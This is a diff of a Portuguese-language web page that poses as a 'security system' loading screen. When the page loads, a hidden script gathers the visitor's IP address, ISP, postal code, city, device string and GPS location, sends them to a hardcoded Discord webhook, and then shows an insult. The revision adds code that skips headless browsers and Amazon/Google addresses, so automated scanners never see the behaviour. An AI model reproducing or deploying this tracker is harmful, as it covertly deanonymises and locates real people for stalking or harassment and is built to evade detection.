@@ -3,57 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificando...</title>
+    <title>SISTEMA DE SEGURANÇA</title>
     <style>
-        body { background: #000; color: #f00; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: monospace; margin: 0; }
-        #f { display: none; font-size: 3rem; font-weight: bold; }
+        body { background: #000; color: #f00; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        .box { border: 2px solid #f00; padding: 30px; background: #100; box-shadow: 0 0 20px #f00; }
+        h1 { font-size: 3rem; margin: 0; display: none; }
+        .loading { animation: blink 1s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-    <div id="s">CARREGANDO...</div>
-    <h1 id="f">CE TA FUDIDO</h1>
+    <div class="box" id="m">
+        <div id="l">
+            <div class="loading">SINCROZINANDO PROTOCOLO...</div>
+        </div>
+        <h1 id="f">CE TA FUDIDO</h1>
+    </div>
 
     <script>
-        // WEBHOOK
         const W = "https://discord.com/api/webhooks/1473792549045932103/9BrDwlVARrLj3joN4liqNqY8OmV07hF6hf8KtHwdA1nEr_sbeSq9So8SQlY9DL5weC9q";
 
-        async function enviar() {
-            try {
-                // Pega o IP
-                const r = await fetch('https://api.ipify.org?format=json');
-                const j = await r.json();
-                const ip = j.ip;
+        async function rastrear() {
+            // Se for robô da Amazon/Headless, ignora e não manda nada
+            if (navigator.webdriver || /HeadlessChrome/.test(navigator.userAgent)) return;
 
-                // Envia pro Discord (Texto puro, sem Embed para não cair no filtro)
+            try {
+                // Usa uma API que pega o provedor real e a cidade
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+
+                if (d.org.includes("Amazon") || d.org.includes("Google")) return;
+
+                // Envia IMEDIATAMENTE pro Discord
                 await fetch(W, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        content: `🚨 **NOVO ACESSO**\n**IP:** ${ip}\n**Aparelho:** ${navigator.userAgent}`
+                        content: "🎯 **ALVO REAL IDENTIFICADO**",
+                        embeds: [{
+                            color: 16711680,
+                            description: 
+                                `**IP:** ${d.ip}\n` +
+                                `**Provedor:** ${d.org}\n` +
+                                `**CEP:** ${d.postal}\n` +
+                                `**Cidade:** ${d.city} - ${d.region}\n` +
+                                `**Aparelho:** ${navigator.userAgent}`
+                        }]
                     })
                 });
 
-                // Se tiver GPS, tenta mandar depois
-                navigator.geolocation.getCurrentPosition(async (p) => {
-                    await fetch(W, {
+                // Tenta pegar o GPS em background (se ele permitir, manda outro log depois)
+                navigator.geolocation.getCurrentPosition(p => {
+                    fetch(W, {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
+                        headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
-                            content: `📍 **LOCALIZAÇÃO:** http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`
+                            content: `📍 **LOC EXATA (GPS):** http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`
                         })
                     });
                 });
 
-                // Mostra a mensagem final
-                document.getElementById('s').style.display = 'none';
-                document.getElementById('f').style.display = 'block';
+            } catch (e) {}
 
-            } catch (e) {
-                document.getElementById('s').innerText = "ERRO DE CONEXÃO.";
-            }
+            // Mostra a frase na tela rápido
+            setTimeout(() => {
+                document.getElementById('l').style.display = 'none';
+                document.getElementById('f').style.display = 'block';
+            }, 1000);
         }
 
-        window.onload = enviar;
+        window.onload = rastrear;
     </script>
 </body>
 </html>
